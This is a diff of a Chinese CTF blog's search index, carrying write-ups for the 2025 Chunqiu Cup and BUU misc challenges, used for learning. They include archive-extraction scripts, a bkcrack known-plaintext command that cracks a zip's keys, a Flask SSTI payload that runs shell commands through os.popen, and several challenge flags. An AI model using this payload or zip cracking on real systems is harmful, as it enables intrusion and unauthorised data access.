@@ -1,6 +1,18 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>114514分钟能了解SSRF吗</title>
+    <url>/2025/07/07/114514%E5%88%86%E9%92%9F%E8%83%BD%E4%BA%86%E8%A7%A3SSRF%E5%90%97/</url>
+    <content><![CDATA[<h1 id="♿1919810分钟能了解SSRF吗♿"><a href="#♿1919810分钟能了解SSRF吗♿" class="headerlink" title="♿1919810分钟能了解SSRF吗♿"></a>♿1919810分钟能了解SSRF吗♿</h1><p>冲刺♿，冲刺♿，冲♿</p>
+<h2 id="SSRF是扫码"><a href="#SSRF是扫码" class="headerlink" title="SSRF是扫码"></a>SSRF是扫码</h2><p>SSRF，全称<strong>Server-Side Request Forgery，服务器端请求伪造</strong></p>
+<p>关键词是<code>ip</code></p>
+<p>通过用户输入包含URL的功能&#x2F;请求参数包含外部资源应用来触发s</p>
+]]></content>
+      <tags>
+        <tag>-Web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>2025年中总结</title>
     <url>/2025/06/22/2025%E5%B9%B4%E4%B8%AD%E6%80%BB%E7%BB%93/</url>
     <content><![CDATA[<h1 id="凑新手-捐购-的年中总结"><a href="#凑新手-捐购-的年中总结" class="headerlink" title="凑新手(捐购)的年中总结"></a>凑新手(捐购)的年中总结</h1><p>刚考完狗史期末考试的下午，想着这个学期也结束了<br>感觉期末周忙了和没忙一样啊，也学不到东西。。。只是为了应付考试和那该死的保研名额(为了争这个也是被卷的不行哈哈…然后也发现和别人无意义的互怼内卷貌似也没啥意义，太累了)<br>当然考试周不能说是没有收获，毕竟这两周还是有点曲折哈哈。<br>先简单的回顾下上半年做了什么吧</p>
@@ -33,15 +45,340 @@
       </tags>
   </entry>
   <entry>
-    <title>114514分钟能了解SSRF吗</title>
-    <url>/2025/07/07/114514%E5%88%86%E9%92%9F%E8%83%BD%E4%BA%86%E8%A7%A3SSRF%E5%90%97/</url>
-    <content><![CDATA[<h1 id="♿1919810分钟能了解SSRF吗♿"><a href="#♿1919810分钟能了解SSRF吗♿" class="headerlink" title="♿1919810分钟能了解SSRF吗♿"></a>♿1919810分钟能了解SSRF吗♿</h1><p>冲刺♿，冲刺♿，冲♿</p>
-<h2 id="SSRF是扫码"><a href="#SSRF是扫码" class="headerlink" title="SSRF是扫码"></a>SSRF是扫码</h2><p>SSRF，全称<strong>Server-Side Request Forgery，服务器端请求伪造</strong></p>
-<p>关键词是<code>ip</code></p>
-<p>通过用户输入包含URL的功能&#x2F;请求参数包含外部资源应用来触发s</p>
+    <title>2025春秋杯冬季赛</title>
+    <url>/2025/01/21/2025%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B/</url>
+    <content><![CDATA[<p>菜鸟第一次打这种公开赛，感觉被橄榄了，第二天两个pyjail是一点办法都没有啊。。。</p>
+<p>听C3师傅说这还不算是上强度的</p>
+<p>而且准备转型Web却只做出来一个签到属于是。。有点丢人了</p>
+<p>还是要多练，下次努力不啃Misc老底</p>
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="简单算术："><a href="#简单算术：" class="headerlink" title="简单算术："></a>简单算术：</h2><p>根据提示，想想异或，直接尝试Cyberchef一把梭</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117150938338.png" alt="image-20250117150938338"></p>
+<h2 id="See-anything-in-these-pics"><a href="#See-anything-in-these-pics" class="headerlink" title="See anything in these pics?"></a>See anything in these pics?</h2><p>附件给了一个压缩包和一张阿兹特克码</p>
+<p>解析得到</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117152921150.png" alt="image-20250117152921150"></p>
+<p>怀疑是压缩包的密码，带入解压压缩包，解压成功，得到一张jpg</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/YVL.jpg" alt="YVL"></p>
+<p>看图片结合提示(图片不止两张)猜测一共有三张图，打开010查一下，发现PNG头<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117153320612.png" alt="image-20250117153320612"></p>
+<p>foremost提取一下发现是全黑的，猜测是crc校验错误，打开010发现报错检验猜想，最后随波逐流直接出(也可以直接随波逐流一把梭)</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117184730714.png" alt="image-20250117184730714"></p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/00000149-%E4%BF%AE%E5%A4%8D%E9%AB%98%E5%AE%BD.png" alt="00000149-修复高宽"></p>
+<h2 id="压力大，写个脚本吧"><a href="#压力大，写个脚本吧" class="headerlink" title="压力大，写个脚本吧"></a>压力大，写个脚本吧</h2><p>先试着解压几个包，把给的密文base64解码后是FGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFG</p>
+<p>然后发现后面几个包的密文都是一样的，写个脚本直接爆</p>
+<pre><code class="highlight python"><span class="keyword">import</span> zipfile
+<span class="keyword">import</span> re
+zipname = <span class="string">&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\zip_99.zip&quot;</span>
+<span class="keyword">while</span> <span class="literal">True</span>:
+    <span class="keyword">if</span> zipname != <span class="string">&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\zip_1.zip&quot;</span>:
+        ts1 = zipfile.ZipFile(zipname)
+        passwd =<span class="string">b&#x27;FGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFG&#x27;</span>
+        ts1.extractall(<span class="string">&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\&quot;</span>,pwd=passwd)
+        zipname = <span class="string">&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\&quot;</span>+ts1.namelist()[<span class="number">0</span>]
+    <span class="keyword">else</span>:
+        <span class="built_in">print</span>(<span class="string">&quot;find&quot;</span>)</code></pre>
+
+<p>结果发现第95包密码换了。解压显示失败，那么直接获取txt的内容解码后解压压缩包。</p>
+<pre><code class="highlight python"><span class="keyword">import</span> zipfile
+<span class="keyword">import</span> os
+<span class="keyword">import</span> base64
+
+<span class="keyword">def</span> <span class="title function_">decode_password</span>(<span class="params">file_path</span>):
+    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:
+        encoded_password = f.read().strip()
+    decoded_password = base64.b64decode(encoded_password).decode(<span class="string">&#x27;utf-8&#x27;</span>)
+    <span class="keyword">return</span> decoded_password
+<span class="keyword">def</span> <span class="title function_">extract_zip</span>(<span class="params">zip_file, password, extract_to</span>):
+    <span class="keyword">try</span>:
+        <span class="keyword">with</span> zipfile.ZipFile(zip_file) <span class="keyword">as</span> zf:
+            zf.extractall(path=extract_to, pwd=password.encode())
+            <span class="built_in">print</span>(<span class="string">f&quot;解压成功: <span class="subst">&#123;zip_file&#125;</span> 到 <span class="subst">&#123;extract_to&#125;</span>&quot;</span>)
+            <span class="keyword">return</span> zf.namelist()  
+    <span class="keyword">except</span> (zipfile.BadZipFile, RuntimeError) <span class="keyword">as</span> e:
+        <span class="built_in">print</span>(<span class="string">f&quot;解压失败: <span class="subst">&#123;zip_file&#125;</span>, 错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)
+        <span class="keyword">return</span> []
+<span class="keyword">def</span> <span class="title function_">recursive_extract</span>(<span class="params">start_number=<span class="number">99</span>,parent_dir=<span class="string">&#x27;C:\\Users\\ayano\\Desktop\\output\\zip_100\\&#x27;</span></span>):
+    current_number = start_number
+    <span class="keyword">while</span> <span class="literal">True</span>:
+        zip_filename = <span class="string">f&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\zip_<span class="subst">&#123;current_number&#125;</span>.zip&quot;</span>
+        password_filename = <span class="string">f&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\password_<span class="subst">&#123;current_number&#125;</span>.txt&quot;</span>
+        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(zip_filename):
+            <span class="built_in">print</span>(<span class="string">f&quot;文件不存在: <span class="subst">&#123;zip_filename&#125;</span>&quot;</span>)
+            <span class="keyword">break</span>
+        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(password_filename):
+            <span class="built_in">print</span>(<span class="string">f&quot;密码文件不存在: <span class="subst">&#123;password_filename&#125;</span>&quot;</span>)
+            <span class="keyword">break</span>
+        password = decode_password(password_filename)
+        extracted_files = extract_zip(zip_filename, password,parent_dir)
+        <span class="keyword">if</span> <span class="keyword">not</span> extracted_files:
+            <span class="keyword">break</span>
+        next_zip_file = <span class="literal">None</span>
+        <span class="keyword">for</span> extracted_file <span class="keyword">in</span> extracted_files:
+            <span class="keyword">if</span> extracted_file.endswith(<span class="string">&#x27;.zip&#x27;</span>):
+                next_zip_file = extracted_file
+                <span class="keyword">break</span>
+        <span class="keyword">if</span> next_zip_file <span class="keyword">is</span> <span class="literal">None</span>:
+            <span class="keyword">break</span>
+        current_number -= <span class="number">1</span>
+<span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:
+    recursive_extract()</code></pre>
+
+<p>解码后得到hint<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117181031624.png" alt="image-20250117181031624"></p>
+<p>应该是让我们把每个压缩包的密码解码后组成hex码产生一个png图片</p>
+<p>根据我们第一个密码FG…..，显然不是文件头的格式，那么从0开始到99提取文件内容</p>
+<pre><code class="highlight python"><span class="keyword">import</span> os
+<span class="keyword">import</span> base64
+
+
+<span class="keyword">def</span> <span class="title function_">decode_password</span>(<span class="params">file_path</span>):
+    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:
+        encoded_password = f.read().strip()
+    decoded_password = base64.b64decode(encoded_password).decode(<span class="string">&#x27;utf-8&#x27;</span>)
+    <span class="keyword">return</span> decoded_password
+
+<span class="keyword">def</span> <span class="title function_">extract_decoded_passwords</span>(<span class="params">start_number=<span class="number">0</span>, output_file=<span class="string">&#x27;decoded_passwords.txt&#x27;</span></span>):
+    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> output_f:
+        current_number = start_number
+        <span class="keyword">while</span> <span class="literal">True</span>:
+            password_filename = <span class="string">f&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\password_<span class="subst">&#123;current_number&#125;</span>.txt&quot;</span>
+            <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(password_filename):
+                <span class="built_in">print</span>(<span class="string">f&quot;密码文件不存在: <span class="subst">&#123;password_filename&#125;</span>&quot;</span>)
+                <span class="keyword">break</span>
+            decoded_password = decode_password(password_filename)
+            output_f.write(<span class="string">f&quot;<span class="subst">&#123;decoded_password&#125;</span>&quot;</span>)
+            <span class="built_in">print</span>(<span class="string">f&quot;密码_<span class="subst">&#123;current_number&#125;</span> 解码并保存。&quot;</span>)
+            current_number += <span class="number">1</span>
+
+
+<span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:
+    extract_decoded_passwords(start_number=<span class="number">0</span>, output_file=<span class="string">&#x27;C:\\Users\\ayano\\Desktop\\1.txt&#x27;</span>)</code></pre>
+
+<p>最终得到的在010中粘贴为hex码，得到一个二维码，扫一下</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117181408150.png"></p>
+<h2 id="Infinity"><a href="#Infinity" class="headerlink" title="Infinity"></a>Infinity</h2><p>首先看提示是不知道有什么用的</p>
+<p>拿到一张png，用010查一下看到zip头</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119164920069.png" alt="image-20250119164920069"></p>
+<p>foremost提取一下</p>
+<p>得到一个压缩包，在解压几次后发现是个嵌套的压缩包</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119165111733.png" alt="image-20250119165111733">一共有7z,tar,zip三种类型的压缩包</p>
+<p>同时注意到文件名有点可疑，留意一下，可能后续要用</p>
+<p>脚本：</p>
+<pre><code class="highlight plaintext">import os
+import zipfile
+import tarfile
+import py7zr
+import shutil
+
+
+def extract_zip(zip_path, extract_dir):
+    &quot;&quot;&quot;解压zip文件&quot;&quot;&quot;
+    with zipfile.ZipFile(zip_path, &#x27;r&#x27;) as zip_ref:
+        zip_ref.extractall(extract_dir)
+        return zip_ref.namelist()  # 返回解压出来的文件列表
+
+
+def extract_tar(tar_path, extract_dir):
+    &quot;&quot;&quot;解压tar文件&quot;&quot;&quot;
+    with tarfile.open(tar_path, &#x27;r&#x27;) as tar_ref:
+        tar_ref.extractall(extract_dir)
+        return tar_ref.getnames()  # 返回解压出来的文件列表
+
+
+def extract_7z(archive_path, extract_dir):
+    &quot;&quot;&quot;解压7z文件&quot;&quot;&quot;
+    with py7zr.SevenZipFile(archive_path, mode=&#x27;r&#x27;) as archive_ref:
+        archive_ref.extractall(extract_dir)
+        return archive_ref.getnames()  # 返回解压出来的文件列表
+
+
+def handle_compressed_file(file_path, extract_dir, output_txt):
+    &quot;&quot;&quot;处理压缩包文件：解压并记录文件名（去掉后缀并连接）&quot;&quot;&quot;
+    if file_path.endswith(&#x27;.zip&#x27;):
+        extracted_files = extract_zip(file_path, extract_dir)
+    elif file_path.endswith(&#x27;.tar&#x27;):
+        extracted_files = extract_tar(file_path, extract_dir)
+    elif file_path.endswith(&#x27;.7z&#x27;):
+        extracted_files = extract_7z(file_path, extract_dir)
+    else:
+        print(f&quot;不支持的压缩格式：&#123;file_path&#125;&quot;)
+        return []
+
+    # 记录去掉后缀并连接的文件名
+    with open(output_txt, &#x27;a&#x27;) as output_file:
+        for file_name in extracted_files:
+            name_without_extension = os.path.splitext(file_name)[0]  # 去掉后缀
+            output_file.write(f&quot;&#123;name_without_extension&#125;\n&quot;)
+
+    return extracted_files
+
+
+def process_zip(zip_path, extract_dir, output_txt):
+    &quot;&quot;&quot;处理zip文件并递归解压其中的压缩包&quot;&quot;&quot;
+    # 解压当前zip文件并返回解压后的文件列表
+    extracted_files = extract_zip(zip_path, extract_dir)
+
+    for extracted_file in extracted_files:
+        extracted_file_path = os.path.join(extract_dir, extracted_file)
+
+        if os.path.isdir(extracted_file_path):
+            continue  # 跳过目录
+
+        # 如果解压出来的是压缩包，再进行递归处理
+        if extracted_file.endswith((&#x27;.zip&#x27;, &#x27;.tar&#x27;, &#x27;.7z&#x27;)):
+            # 解压嵌套压缩包并处理
+            handle_compressed_file(extracted_file_path, extract_dir, output_txt)
+            # 如果是嵌套的压缩包，再递归调用
+            if extracted_file.endswith(&#x27;.zip&#x27;):
+                process_zip(extracted_file_path, extract_dir, output_txt)
+            elif extracted_file.endswith(&#x27;.tar&#x27;):
+                process_tar(extracted_file_path, extract_dir, output_txt)
+            elif extracted_file.endswith(&#x27;.7z&#x27;):
+                process_7z(extracted_file_path, extract_dir, output_txt)
+
+        else:
+            handle_compressed_file(extracted_file_path, extract_dir, output_txt)
+
+    # 删除当前处理的压缩包
+    if zip_path.endswith(&#x27;.zip&#x27;):
+        os.remove(zip_path)
+
+
+def process_tar(tar_path, extract_dir, output_txt):
+    &quot;&quot;&quot;处理tar文件并递归解压其中的压缩包&quot;&quot;&quot;
+    extracted_files = extract_tar(tar_path, extract_dir)
+    for extracted_file in extracted_files:
+        extracted_file_path = os.path.join(extract_dir, extracted_file)
+
+        if os.path.isdir(extracted_file_path):
+            continue
+
+        if extracted_file.endswith((&#x27;.zip&#x27;, &#x27;.tar&#x27;, &#x27;.7z&#x27;)):
+            handle_compressed_file(extracted_file_path, extract_dir, output_txt)
+            if extracted_file.endswith(&#x27;.zip&#x27;):
+                process_zip(extracted_file_path, extract_dir, output_txt)
+            elif extracted_file.endswith(&#x27;.tar&#x27;):
+                process_tar(extracted_file_path, extract_dir, output_txt)
+            elif extracted_file.endswith(&#x27;.7z&#x27;):
+                process_7z(extracted_file_path, extract_dir, output_txt)
+
+    # 删除当前处理的压缩包
+    if tar_path.endswith(&#x27;.tar&#x27;):
+        os.remove(tar_path)
+
+
+def process_7z(archive_path, extract_dir, output_txt):
+    &quot;&quot;&quot;处理7z文件并递归解压其中的压缩包&quot;&quot;&quot;
+    extracted_files = extract_7z(archive_path, extract_dir)
+    for extracted_file in extracted_files:
+        extracted_file_path = os.path.join(extract_dir, extracted_file)
+
+        if os.path.isdir(extracted_file_path):
+            continue
+
+        if extracted_file.endswith((&#x27;.zip&#x27;, &#x27;.tar&#x27;, &#x27;.7z&#x27;)):
+            handle_compressed_file(extracted_file_path, extract_dir, output_txt)
+            if extracted_file.endswith(&#x27;.zip&#x27;):
+                process_zip(extracted_file_path, extract_dir, output_txt)
+            elif extracted_file.endswith(&#x27;.tar&#x27;):
+                process_tar(extracted_file_path, extract_dir, output_txt)
+            elif extracted_file.endswith(&#x27;.7z&#x27;):
+                process_7z(extracted_file_path, extract_dir, output_txt)
+
+    # 删除当前处理的压缩包
+    if archive_path.endswith(&#x27;.7z&#x27;):
+        os.remove(archive_path)
+
+
+def main():
+    zip_path = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\1.zip&#x27;
+    extract_dir = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\extracted&#x27;
+    output_txt = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\output.txt&#x27;
+
+    if not os.path.exists(extract_dir):
+        os.makedirs(extract_dir)
+
+    # 开始处理压缩包
+    with open(output_txt, &#x27;w&#x27;) as output_file:
+        output_file.write(&quot;&quot;)
+    process_zip(zip_path, extract_dir, output_txt)
+
+
+if __name__ == &quot;__main__&quot;:
+    main()</code></pre>
+
+<p>再对提出来的文件名做两种处理</p>
+<pre><code class="highlight plaintext">def reverse_file_names(input_txt, output_txt):
+    &quot;&quot;&quot;读取文件名并将其从后往前连接&quot;&quot;&quot;
+    with open(input_txt, &#x27;r&#x27;) as infile:
+        file_names = infile.readlines()
+
+    # 去掉换行符并从后往前连接
+    reversed_file_names = [name.strip() for name in reversed(file_names)]
+
+    # 将连接后的文件名写入新文件
+    with open(output_txt, &#x27;w&#x27;) as outfile:
+        outfile.write(&quot;连接后的文件名（从后往前）：\n&quot;)
+        outfile.write(&quot;&quot;.join(reversed_file_names))  # 使用空格连接文件名
+def remove_newlines_and_connect(input_txt, output_txt):
+    &quot;&quot;&quot;读取文件名并去掉换行符，连接所有文件名&quot;&quot;&quot;
+    with open(input_txt, &#x27;r&#x27;) as infile:
+        # 读取所有行并去掉换行符
+        file_names = infile.read().splitlines()
+
+    # 将文件名用空格连接
+    connected_file_names = &quot;&quot;.join(file_names)
+
+    # 将连接后的文件名写入新文件
+    with open(output_txt, &#x27;w&#x27;) as outfile:
+        outfile.write(&quot;连接后的文件名（去掉换行符）：\n&quot;)
+        outfile.write(connected_file_names)  # 直接写入连接后的字符串
+
+def main():
+    input_txt = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\output.txt&#x27;
+    output1_txt = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\output_reversed.txt&#x27;
+    output2_txt = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\output_simple.txt&#x27;
+    reverse_file_names(input_txt, output1_txt)
+    remove_newlines_and_connect(input_txt, output2_txt)
+
+if __name__ == &quot;__main__&quot;:
+    main()</code></pre>
+
+<p>根据提示BASE58-Ripple、SM4-ECB</p>
+<p>先后尝试顺序的和逆序的</p>
+<p>最后逆序的得到以下</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119165516321.png" alt="image-20250119165516321"></p>
+<p>看一眼是png的文件头，在010以16进制粘贴得到一张图片</p>
+<p><img src="/2025/01/21/2025%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B/Users/ayano/Desktop/flag2.png" alt="flag"></p>
+<p>在谷歌搜图后判断出是 DataMatrix码</p>
+<p>在线工具解决 <img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119170503355.png" alt="image-20250119170503355"></p>
+<h2 id="音频的秘密"><a href="#音频的秘密" class="headerlink" title="音频的秘密"></a>音频的秘密</h2><p>解压得到一个wav文件</p>
+<p>根据提示deepsound和弱口令</p>
+<p>试一下123？</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119181253709.png" alt="image-20250119181253709"></p>
+<p>运气比较好直接出来了</p>
+<p>提取zip后发现需要密码打开</p>
+<p>在010查过之后发现是真加密<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119181451213.png" alt="image-20250119181451213"></p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119181524239.png" alt="image-20250119181524239"></p>
+<p>没有提示，直接尝试明文爆破，已知png文件头，以这个为明文开始爆</p>
+<pre><code class="highlight bash"><span class="built_in">echo</span> 89504E470D0A1A0A0000000D49484452 | xxd -r -ps &gt; png_header
+bkcrack -C flag.zip -c flag.png -p png_header -o 0</code></pre>
+
+<p>然后得到密钥 <code>29d29517 0fa535a9 abc67696</code></p>
+<pre><code class="highlight bash">bkcrack -C flag.zip -c flag.png -k 29d29517 0fa535a9 abc67696 -d flag.png</code></pre>
+
+<p>得到flag.png</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/flag.png" alt="flag">通过stegsolve看一下有没有lsb隐写</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/893940eded9dc333fe7e104a38fccaf5.png" alt="893940eded9dc333fe7e104a38fccaf5"></p>
+<p>左上角一看肯定有lsb稳了，zsteg一跑</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119203932034.png" alt="image-20250119203932034"></p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a>easy_flask</h2><p>根据提示想想flask,应该是SSTI漏洞</p>
+<p>先试着打一下，看看有没有绕过</p>
+<pre><code class="highlight plaintext">&#123;&#123; config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read() &#125;&#125;</code></pre>
+
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117162602849.png" alt="image-20250117162602849"></p>
+<p>直接爆了，那就ls换cat flag解决</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117162704054.png" alt="image-20250117162704054"></p>
 ]]></content>
       <tags>
-        <tag>-Web</tag>
+        <tag>-CTF -misc -WP</tag>
       </tags>
   </entry>
   <entry>
@@ -455,340 +792,165 @@ flag = long_to_bytes(m)
       </tags>
   </entry>
   <entry>
-    <title>2025春秋杯冬季赛</title>
-    <url>/2025/01/21/2025%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B/</url>
-    <content><![CDATA[<p>菜鸟第一次打这种公开赛，感觉被橄榄了，第二天两个pyjail是一点办法都没有啊。。。</p>
-<p>听C3师傅说这还不算是上强度的</p>
-<p>而且准备转型Web却只做出来一个签到属于是。。有点丢人了</p>
-<p>还是要多练，下次努力不啃Misc老底</p>
-<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="简单算术："><a href="#简单算术：" class="headerlink" title="简单算术："></a>简单算术：</h2><p>根据提示，想想异或，直接尝试Cyberchef一把梭</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117150938338.png" alt="image-20250117150938338"></p>
-<h2 id="See-anything-in-these-pics"><a href="#See-anything-in-these-pics" class="headerlink" title="See anything in these pics?"></a>See anything in these pics?</h2><p>附件给了一个压缩包和一张阿兹特克码</p>
-<p>解析得到</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117152921150.png" alt="image-20250117152921150"></p>
-<p>怀疑是压缩包的密码，带入解压压缩包，解压成功，得到一张jpg</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/YVL.jpg" alt="YVL"></p>
-<p>看图片结合提示(图片不止两张)猜测一共有三张图，打开010查一下，发现PNG头<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117153320612.png" alt="image-20250117153320612"></p>
-<p>foremost提取一下发现是全黑的，猜测是crc校验错误，打开010发现报错检验猜想，最后随波逐流直接出(也可以直接随波逐流一把梭)</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117184730714.png" alt="image-20250117184730714"></p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/00000149-%E4%BF%AE%E5%A4%8D%E9%AB%98%E5%AE%BD.png" alt="00000149-修复高宽"></p>
-<h2 id="压力大，写个脚本吧"><a href="#压力大，写个脚本吧" class="headerlink" title="压力大，写个脚本吧"></a>压力大，写个脚本吧</h2><p>先试着解压几个包，把给的密文base64解码后是FGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFG</p>
-<p>然后发现后面几个包的密文都是一样的，写个脚本直接爆</p>
-<pre><code class="highlight python"><span class="keyword">import</span> zipfile
-<span class="keyword">import</span> re
-zipname = <span class="string">&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\zip_99.zip&quot;</span>
-<span class="keyword">while</span> <span class="literal">True</span>:
-    <span class="keyword">if</span> zipname != <span class="string">&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\zip_1.zip&quot;</span>:
-        ts1 = zipfile.ZipFile(zipname)
-        passwd =<span class="string">b&#x27;FGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFG&#x27;</span>
-        ts1.extractall(<span class="string">&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\&quot;</span>,pwd=passwd)
-        zipname = <span class="string">&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\&quot;</span>+ts1.namelist()[<span class="number">0</span>]
-    <span class="keyword">else</span>:
-        <span class="built_in">print</span>(<span class="string">&quot;find&quot;</span>)</code></pre>
+    <title>BUU—MISC刷题记录</title>
+    <url>/2024/12/20/BUU%E2%80%94MISC%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<p>浅浅记录一下BUU里感觉比较有价值的题目</p>
+<h2 id="0荷兰宽带泄露"><a href="#0荷兰宽带泄露" class="headerlink" title="0荷兰宽带泄露"></a>0荷兰宽带泄露</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207192240105.png" alt="image-20241207192240105"></p>
+<p>解压后发现一个bin文件，第一次碰到不知道怎么处理，看了一下别的师傅的wp了解到一种新的工具：<code>RouterPassView</code>(用于破解宽带数据文件的密码)，题目没有提示Flag</p>
+<p>那试试用户名<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207192618872.png" alt="image-20241207192618872"></p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207192553975.png" alt="image-20241207192553975"></p>
+<p>解压发现是<code>xls</code>文件,猜测是<code>xls</code>隐写</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207193031701.png" alt="image-20241207193031701"></p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207193626760.png" alt="image-20241207193626760"></p>
+<p>但是010一查发现有pk头,改后缀一查<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207194005524.png" alt="image-20241207194005524"></p>
+<p><code>flag&#123;M9eVfi2Pcs#&#125;</code></p>
+<h2 id="1被劫持的神秘礼物"><a href="#1被劫持的神秘礼物" class="headerlink" title="1被劫持的神秘礼物"></a>1被劫持的神秘礼物</h2><p>下载是一个流量文件，结合标题应该是流量劫持</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207194738383.png" alt="image-20241207194738383"></p>
+<p>主要是HTTP流量，直接追踪流</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207194834914.png" alt="image-20241207194834914"></p>
+<p>用<code>captfencoder</code>MD5一下结束战斗</p>
+<p><code>flag&#123;1d240aafe21a86afc11f38a45b541a49&#125;</code></p>
+<h2 id="2被偷走的文件1"><a href="#2被偷走的文件1" class="headerlink" title="2被偷走的文件1"></a>2被偷走的文件1</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207195352502.png" alt="image-20241207195352502"></p>
+<p>用<code>foremost</code>分离，解压需要密码，先确定流量中没有藏密码，再暴力破解</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207200247505.png" alt="image-20241207200247505"></p>
+<p><code>flag&#123;6fe99a5d03fb01f833ec3caa80358fa3&#125;</code></p>
+<h2 id="3藏藏藏"><a href="#3藏藏藏" class="headerlink" title="3藏藏藏"></a>3藏藏藏</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207200530486.png" alt="image-20241207200530486"></p>
+<p>看到图片结合题目名，感觉图片隐写或者图片里包含文件<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207200653951.png" alt="image-20241207200653951"></p>
+<p>顺利分离出一个压缩包，打开是一个docx文件，隐写无疑了</p>
+<p>然而里面是一个二维码（扫兴啊），直接扫就出来了</p>
